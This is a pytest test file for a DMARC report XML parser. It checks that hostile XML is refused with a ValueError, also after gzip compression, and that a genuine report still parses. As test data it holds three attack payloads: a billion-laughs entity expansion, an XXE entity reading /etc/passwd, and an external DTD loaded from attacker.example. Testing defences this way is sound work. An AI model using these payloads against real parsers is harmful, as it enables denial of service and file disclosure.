"""An aggregate report arrives from strangers, so the parser treats it as hostile.

A DMARC report is XML that any receiver on the internet can send you. Two
classic attacks live in the XML prologue: a declared entity that expands into
gigabytes, and one that reads a file off the machine. Neither belongs in a
DMARC report, which has no legitimate reason to declare an entity at all, so
the parser refuses any document that tries.

`parse` promises ValueError for a bad feed. These check that a hostile document
arrives as that same ValueError rather than as some other exception the caller
never agreed to handle.
"""

from __future__ import annotations

import gzip

import pytest

from engine.dmarc.parser import parse

_BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<feedback><report_metadata><org_name>&lol3;</org_name></report_metadata></feedback>"""

_XXE = b"""<?xml version="1.0"?>
<!DOCTYPE feedback [<!ENTITY secret SYSTEM "file:///etc/passwd">]>
<feedback><report_metadata><org_name>&secret;</org_name></report_metadata></feedback>"""

_EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE feedback SYSTEM "http://attacker.example/evil.dtd">
<feedback><report_metadata><org_name>x</org_name></report_metadata></feedback>"""

_REAL = b"""<?xml version="1.0" encoding="UTF-8"?>
<feedback>
  <report_metadata>
    <org_name>google.com</org_name>
    <email>noreply-dmarc-support@google.com</email>
    <report_id>123</report_id>
    <date_range><begin>1700000000</begin><end>1700086400</end></date_range>
  </report_metadata>
  <policy_published>
    <domain>example.com</domain><p>none</p><sp>none</sp><pct>100</pct>
  </policy_published>
  <record>
    <row><source_ip>198.51.100.1</source_ip><count>2</count>
      <policy_evaluated><disposition>none</disposition><dkim>pass</dkim><spf>pass</spf></policy_evaluated>
    </row>
    <identifiers><header_from>example.com</header_from></identifiers>
    <auth_results>
      <dkim><domain>example.com</domain><result>pass</result></dkim>
      <spf><domain>example.com</domain><result>pass</result></spf>
    </auth_results>
  </record>
</feedback>"""


@pytest.mark.parametrize(
    ("name", "payload"),
    [
        ("billion laughs", _BILLION_LAUGHS),
        ("external entity", _XXE),
        ("external dtd", _EXTERNAL_DTD),
    ],
)
def test_a_hostile_document_is_refused_as_a_value_error(name: str, payload: bytes) -> None:
    with pytest.raises(ValueError) as caught:
        parse(payload)
    assert "entity" in str(caught.value).lower() or "doctype" in str(caught.value).lower()


def test_the_refusal_survives_compression() -> None:
    """A report usually arrives gzipped, so the guard runs after decompression."""
    with pytest.raises(ValueError):
        parse(gzip.compress(_BILLION_LAUGHS))


def test_a_real_report_still_parses() -> None:
    report = parse(_REAL)
    assert report.org_name == "google.com"
    assert len(report.records) == 1
    assert report.records[0].count == 2
